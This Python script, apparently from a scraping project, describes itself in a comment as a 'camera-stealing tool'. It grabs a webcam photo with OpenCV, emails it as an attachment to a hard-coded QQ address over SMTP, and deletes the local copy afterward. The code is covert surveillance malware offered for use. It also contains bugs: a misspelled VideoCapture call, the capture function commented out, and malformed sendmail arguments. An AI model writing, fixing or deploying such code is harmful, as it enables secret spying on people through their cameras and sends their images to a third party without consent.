# coding = utf-8
"""
@All-project: Spider
@author: ZWNONG
@file: get_camera_photos.py
@time: 2020-07-17 20:15:22
"""
"""
发送邮箱需要打开 imap服务器
"""
import cv2  # pip install opencv-python
import os
from smtplib import SMTP_SSL  # 加密认证 传输协议
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText  # 构建文本
from email.mime.multipart import MIMEMultipart  # 构建有简体 发送人
from email.header import Header  # 构建发送内容


# 摄像头窃取工具  opencv

def get_photo():
    """
    调用摄像头
    :return:
    """
    cap = cv2.VideoCaptrue(0)  # 开启摄像头
    f, frame = cap.read()  # 保存图片
    cv2.imwrite('image.jpg', frame)  # 将图片保存到本地
    cap.release()  # 关闭摄像头


def send_photo_to_email():
    # 发送邮件
    host_server = 'smtp.qq.com'
    pwd = '邮箱授权码'  # 打开smtp获取到的授权码
    from_qq_email = '849130403@qq.com'  # 发件人
    to_qq_email = '374579504@qq.com'  # 收件人
    msg = MIMEMultipart()  # 发送邮件

    msg['Subject'] = Header('摄像头图片', 'UTF-8')  # 邮箱主题
    msg['From'] = from_qq_email
    msg['To'] = to_qq_email
    msg.attach(MIMEText("照片", "html", "UTF-8"))  # 文本内容

    image = MIMEApplication(open('image.jpg', 'rb').read())
    image.add_header('Content-Disposition', 'attachment', filename='image.jpg')
    msg.attach(image)   # 添加附件

    # 执行邮件
    smtp = SMTP_SSL(host_server)
    smtp.login(from_qq_email, pwd)
    smtp.sendmail(from_qq_email, to_qq_email, msg, msg.as_string())
    smtp.quit()


if __name__ == '__main__':
    # get_photo()
    send_photo_to_email()
    os.remove('image.jpg')




